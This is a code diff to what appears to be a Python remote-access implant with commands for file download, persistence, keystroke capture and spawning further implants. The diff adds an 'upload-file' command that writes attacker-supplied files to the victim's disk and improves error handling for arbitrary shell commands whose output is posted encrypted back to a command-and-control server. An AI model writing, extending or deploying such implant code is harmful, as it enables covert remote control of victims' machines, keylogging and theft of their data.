@@ -48,6 +48,17 @@ def dfile(fname):
       imgbytes = image_file.read()
   return "0000100001" + imgbytes
 
+def ufile(base64file, fname):
+  fname = fname.replace('"','')
+  filebytes = base64.b64decode(base64file)
+  try:
+    output_file = open(fname, 'w')
+    output_file.write(filebytes)
+    output_file.close()
+    return "Uploaded file %%s" %% fname
+  except Exception as e:
+    return "Error with source file: %%s" %% e
+  
 def sai(delfile=False):
   import uuid
   filename = "/tmp/%%s.sh" %% (uuid.uuid4().hex)
@@ -126,6 +137,10 @@ while(True):
           elif "download-file" in cmd:  
             fname = cmd.replace("download-file ","")
             returnval = dfile(fname) 
+          elif "upload-file" in cmd:  
+            fullparams = cmd.replace("upload-file ","")
+            params = fullparams.split(":")
+            returnval = ufile(params[1],params[0]) 
           elif "install-persistence" in cmd:  
             returnval = persist() 
           elif "get-keystrokes" in cmd:  
@@ -137,8 +152,11 @@ while(True):
           elif "startanotherimplant-keepfile" in cmd:   
             returnval = sai()  
           else:
-            returnval = subprocess.check_output(cmd, shell=True)
-
+            try:
+              returnval = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
+            except subprocess.CalledProcessError as exc:
+              returnval = "ErrorCmd: %%s" %% exc.output
+              
           server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
           opener = urllib2.build_opener()
           postcookie = encrypt(key, cmd)
